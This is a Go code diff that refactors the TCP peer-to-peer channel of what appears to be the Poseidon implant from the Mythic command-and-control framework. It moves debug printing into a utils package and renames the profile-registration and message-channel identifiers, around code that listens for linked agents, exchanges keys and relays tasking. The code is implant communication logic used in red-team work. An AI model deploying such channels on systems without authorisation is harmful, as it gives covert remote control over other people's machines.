@@ -10,6 +10,8 @@ import (
 	"encoding/binary"
 	"encoding/json"
 	"fmt"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/tasks"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"
 	"io"
 	"net"
 	"os"
@@ -73,7 +75,7 @@ func init() {
 	// these two functions only need to happen once, not each time the profile is started
 	go profile.CreateMessagesForEgressConnections()
 	go profile.CheckForKillDate()
-	AddAvailableProfile(&profile)
+	RegisterAvailableC2Profile(&profile)
 }
 func (c *C2PoseidonTCP) CheckForKillDate() {
 	for true {
@@ -98,10 +100,10 @@ func (c *C2PoseidonTCP) Start() {
 		listen, err = net.Listen("tcp", fmt.Sprintf("0.0.0.0:%s", c.Port))
 
 		if err != nil {
-			PrintDebug(fmt.Sprintf("Failed to bind: %v\n", err))
+			utils.PrintDebug(fmt.Sprintf("Failed to bind: %v\n", err))
 			time.Sleep(1 * time.Second)
 		}
-		PrintDebug(fmt.Sprintf("Listening on %s\n", c.Port))
+		utils.PrintDebug(fmt.Sprintf("Listening on %s\n", c.Port))
 		if c.ShouldStop {
 			return
 		}
@@ -124,9 +126,9 @@ func (c *C2PoseidonTCP) Stop() {
 	}
 	c.ShouldStop = true
 	c.stopListeningChannel <- true
-	PrintDebug("issued stop to poseidon_tcp\n")
+	utils.PrintDebug("issued stop to poseidon_tcp\n")
 	<-c.stoppedChannel
-	PrintDebug("poseidon_tcp fully stopped\n")
+	utils.PrintDebug("poseidon_tcp fully stopped\n")
 }
 func (c *C2PoseidonTCP) GetConfig() string {
 	jsonString, err := json.MarshalIndent(c, "", "  ")
@@ -171,7 +173,7 @@ func (c *C2PoseidonTCP) handleClientConnection(conn net.Conn) {
 	c.EgressTCPConnections[connectionUUID] = conn
 	go c.handleEgressConnectionIncomingMessage(conn)
 	if c.FinishedStaging {
-		PrintDebug(fmt.Sprintf("FinishedStaging, Got a new connection, sending checkin\n"))
+		utils.PrintDebug(fmt.Sprintf("FinishedStaging, Got a new connection, sending checkin\n"))
 		go c.CheckIn()
 	} else if c.ExchangingKeys {
 		//fmt.Printf("ExchangingKeys, starting EKE\n")
@@ -225,7 +227,7 @@ func (c *C2PoseidonTCP) handleEgressConnectionIncomingMessage(conn net.Conn) {
 				copy(readBuffer[totalRead:], nextBuffer)
 				totalRead = totalRead + uint32(readSoFar)
 			}
-			PrintDebug(fmt.Sprintf("Read %d bytes from p2p connection\n", totalRead))
+			utils.PrintDebug(fmt.Sprintf("Read %d bytes from p2p connection\n", totalRead))
 			if raw, err := base64.StdEncoding.DecodeString(string(readBuffer)); err != nil {
 				//log.Println("Error decoding base64 data: ", err.Error())
 				continue
@@ -249,8 +251,8 @@ func (c *C2PoseidonTCP) handleEgressConnectionIncomingMessage(conn net.Conn) {
 				if err != nil {
 					fmt.Printf("Failed to unmarshal message into MythicResponse: %v\n", err)
 				}
-				PrintDebug(fmt.Sprintf("Raw message from mythic: %s\n", string(enc_raw)))
-				HandleInboundMythicMessageFromEgressP2PChannel <- taskResp
+				utils.PrintDebug(fmt.Sprintf("Raw message from mythic: %s\n", string(enc_raw)))
+				tasks.HandleInboundMythicMessageFromEgressChannel <- taskResp
 			} else {
 				if c.ExchangingKeys {
 					// this will be our response to the initial staging message
@@ -369,7 +371,7 @@ func (c *C2PoseidonTCP) SendMessage(sendData []byte) []byte {
 		for _, connectionUUID := range keys {
 			err := binary.Write(c.EgressTCPConnections[connectionUUID], binary.BigEndian, uint32(len(sendData)))
 			if err != nil {
-				PrintDebug(fmt.Sprintf("Failed to send down pipe with error: %v\n", err))
+				utils.PrintDebug(fmt.Sprintf("Failed to send down pipe with error: %v\n", err))
 				// need to make sure we track that this egress connection is dead and should be removed
 				c.RemoveEgressTCPConnection(connectionUUID)
 				time.Sleep(200 * time.Millisecond)
@@ -377,7 +379,7 @@ func (c *C2PoseidonTCP) SendMessage(sendData []byte) []byte {
 			}
 			_, err = c.EgressTCPConnections[connectionUUID].Write(sendData)
 			if err != nil {
-				PrintDebug(fmt.Sprintf("Failed to send with error: %v\n", err))
+				utils.PrintDebug(fmt.Sprintf("Failed to send with error: %v\n", err))
 				// need to make sure we track that this egress connection is dead and should be removed
 				c.RemoveEgressTCPConnection(connectionUUID)
 				time.Sleep(200 * time.Millisecond)
@@ -397,7 +399,7 @@ func (c *C2PoseidonTCP) CreateMessagesForEgressConnections() {
 		msg := <-c.PushChannel
 		raw, err := json.Marshal(msg)
 		if err != nil {
-			PrintDebug(fmt.Sprintf("Failed to marshal message to Mythic: %v\n", err))
+			utils.PrintDebug(fmt.Sprintf("Failed to marshal message to Mythic: %v\n", err))
 			continue
 		}
 		//fmt.Printf("Sending message outbound to websocket: %v\n", msg)
@@ -408,7 +410,7 @@ func (c *C2PoseidonTCP) CreateMessagesForEgressConnections() {
 func (c *C2PoseidonTCP) RemoveEgressTCPConnection(connectionUUID string) bool {
 	c.egressLock.Lock()
 	defer c.egressLock.Unlock()
-	PrintDebug(fmt.Sprintf("removing egress connection: %s\n", connectionUUID))
+	utils.PrintDebug(fmt.Sprintf("removing egress connection: %s\n", connectionUUID))
 	if conn, ok := c.EgressTCPConnections[connectionUUID]; ok {
 		conn.Close()
 		delete(c.EgressTCPConnections, connectionUUID)
@@ -420,7 +422,7 @@ func (c *C2PoseidonTCP) RemoveEgressTCPConnection(connectionUUID string) bool {
 func (c *C2PoseidonTCP) RemoveEgressTCPConnectionByConnection(connection net.Conn) bool {
 	c.egressLock.Lock()
 	defer c.egressLock.Unlock()
-	PrintDebug(fmt.Sprintf("removing egress connection\n"))
+	utils.PrintDebug(fmt.Sprintf("removing egress connection\n"))
 	for connectionUUID, conn := range c.EgressTCPConnections {
 		if connection.RemoteAddr().String() == conn.RemoteAddr().String() {
 			// found the match, remove it and break
